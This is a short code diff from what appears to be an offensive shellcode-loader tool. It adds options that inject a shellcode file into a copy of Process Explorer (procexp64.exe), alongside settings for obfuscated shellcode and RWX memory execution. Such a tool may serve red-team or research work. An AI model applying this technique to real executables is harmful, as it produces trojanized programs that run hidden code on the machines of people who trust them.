@@ -55,6 +55,10 @@ options_test = {
     "test_obfuscated_shc": False,
     "exec_final_shellcode": False,
 
+    "inject_exe": True,
+    "inject_exe_in": "exes/procexp64.exe",
+    "inject_exe_out": "exes/procexp64-a.exe",
+
     "alloc_style": AllocStyle.RWX,
     "exec_style": ExecStyle.CALL,
     "copy_style": CopyStyle.SIMPLE,
@@ -110,6 +114,9 @@ def main():
         if options["exec_final_shellcode"]:
             print("--[ Test Append shellcode ]")
             test_shellcode("main-clean-append.bin")
+
+    if options["inject_exe"]:
+        inject_exe("main-clean-append.bin", options["inject_exe_in"], options["inject_exe_out"])
         
 
 if __name__ == "__main__":
